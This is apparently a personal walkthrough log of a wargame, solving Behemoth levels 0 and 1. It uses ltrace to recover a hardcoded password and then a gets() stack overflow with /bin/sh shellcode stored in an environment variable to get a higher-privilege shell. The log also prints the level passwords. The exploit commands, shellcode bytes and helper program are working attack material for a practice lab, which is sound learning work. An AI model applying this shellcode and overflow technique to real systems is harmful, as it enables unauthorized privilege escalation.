//LEVEL 0
behemoth0@behemoth:/behemoth$ ls
            behemoth0  behemoth2  behemoth4  behemoth6         behemoth7
            behemoth1  behemoth3  behemoth5  behemoth6_reader
behemoth0@behemoth:/behemoth$ file behemoth0
            behemoth0: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, 
            interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=42ba07767dc03cbeb365c18ac0bbeb191842dff7, 


behemoth0@behemoth:/behemoth$ ltrace ./behemoth0
__libc_start_main(0x80485b1, 1, 0xffffd774, 0x8048680 <unfinished ...>
printf("Password: ")                                            = 10
__isoc99_scanf(0x804874c, 0xffffd67b, 0xf7fc5000, 13 Password: password1
)           = 1
strlen("OK^GSYBEX^Y")                                           = 11
strcmp("password1", "eatmyshorts")                              = 1
puts("Access denied.."Access denied..
)                                         = 16
+++ exited (status 0) +++



behemoth0@behemoth:/behemoth$ ./behemoth0 
Password: eatmyshorts
Access granted..
$ cat /etc/behemoth_pass/behemoth1
aesebootiv


// LEVEL 1
behemoth1@behemoth:/behemoth$ ltrace ./behemoth1
__libc_start_main(0x804844b, 1, 0xffffd774, 0x8048480 <unfinished ...>
printf("Password: ")                                            = 10
gets(0xffffd695, 0xffffd774, 0xf7ffcd00, 0x200000 Password: eatmyshorts
)              = 0xffffd695
puts("Authentication failure.\nSorry."Authentication failure.
Sorry.
)                         = 31
+++ exited (status 0) +++




behemoth1@behemoth:/behemoth$ gdb -q ./behemoth1
Reading symbols from ./behemoth1...(no debugging symbols found)...done.
(gdb) r
Starting program: /behemoth/behemoth1 
Password: password1
Authentication failure.
Sorry.
[Inferior 1 (process 17786) exited normally]
(gdb) diasas main
Undefined command: "diasas".  Try "help".
(gdb) disas main
Dump of assembler code for function main:
   0x0804844b <+0>: push   ebp
   0x0804844c <+1>: mov    ebp,esp
   0x0804844e <+3>: sub    esp,0x44
   0x08048451 <+6>: push   0x8048500
   0x08048456 <+11>:    call   0x8048300 <printf@plt>
   0x0804845b <+16>:    add    esp,0x4
   0x0804845e <+19>:    lea    eax,[ebp-0x43]
   0x08048461 <+22>:    push   eax
   0x08048462 <+23>:    call   0x8048310 <gets@plt>
   0x08048467 <+28>:    add    esp,0x4
   0x0804846a <+31>:    push   0x804850c
   0x0804846f <+36>:    call   0x8048320 <puts@plt>
   0x08048474 <+41>:    add    esp,0x4
   0x08048477 <+44>:    mov    eax,0x0
   0x0804847c <+49>:    leave  
   0x0804847d <+50>:    ret    
End of assembler dump.





behemoth1@behemoth:/behemoth$ gdb -q ./behemoth1
Reading symbols from ./behemoth1...(no debugging symbols found)...done.
(gdb) run < <(python -c 'print 128 * "str" + "str2"')
Starting program: /behemoth/behemoth1 < <(python -c 'print 128 * "str" + "str2"')
Password: Authentication failure.
Sorry.
 
Program received signal SIGSEGV, Segmentation fault.
0x72747372 in ?? ()
(gdb) 

behemoth1@behemoth:/behemoth$ 
export MAGICKEY=$(python -c 'print 20 * "\x90" + "\x12\xff\xff\xff\x54\x72\x79\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x50\x64\xcf\x87\x69\x6e\x89\xe3\x89\xe2\xff\x54" + 20 * "\x90"')

export SHELLCODE=$(python -c 'print 20 * "\x90" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + 20 * "\x90"')   



behemoth1@behemoth:/behemoth$ gdb -q ./behemoth1
Reading symbols from ./behemoth1...(no debugging symbols found)...done.
(gdb) break *main
Breakpoint 1 at 0x804844b
(gdb) x/s *((char **)environ)
No symbol table is loaded.  Use the "file" command.
(gdb) run
Starting program: /behemoth/behemoth1 

Breakpoint 1, 0x0804844b in main ()
(gdb) x/s *((char **)environ)
...
0xffffde66:	"MAGICKEY=", '\220' <repeats 32 times>, "\342\377\377\377Try/bin/sh\n\301\211°\v̀1\300", '\220' <repeats 32 times>
(gdb) run < <(python -c 'print 80 * "\x90" +  "\x66\xde\xff\xff"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /behemoth/behemoth1 < <(python -c 'print 80 * "\x90" +  "\x66\xde\xff\xff"')

Breakpoint 1, 0x0804844b in main ()
(gdb) continue
Continuing.
Password: Authentication failure.
Sorry.

Program received signal SIGSEGV, Segmentation fault.
0x90909090 in ?? ()
(gdb) 

//attempted to overflow the program in gdb using the memory addr listed for MAGICKEY


behemoth1@behemoth:/behemoth$ cd /tmp
behemoth1@behemoth:/tmp$ vim loc_key.c
    #include <stdio.h>
    #include <stdlib.h>

    int main(int argc, char* argv[])
    {
    printf("%s is at %p\n", argv[1], getenv(argv[1]));
    }
behemoth1@behemoth:/tmp$ gcc -m32 loc_key.c -o key_mem_loc
behemoth1@behemoth:/tmp$ ./key_mem_loc MAGICKEY
MAGICKEY is at 0xffffde7f
behemoth1@behemoth:/tmp$ (python -c 'print 80 * "\x90" +  "\x7f\xde\xff\xff"';cat) | /behemoth/behemoth1
Password: Authentication failure.
Sorry.

Segmentation fault
//executing from shell does not overflow the buffer properly.
//re-created env and got new memory location and tried to run exploit.
behemoth1@behemoth:/tmp$ (python -c 'print 71 * "\x90" + "\x93\xde\xff\xff"';cat) | /behemoth/behemoth1
Password: Authentication failure.
Sorry.
whoami
behemoth2
cat /etc/behemoth_pass/behemoth2
eimahquuof
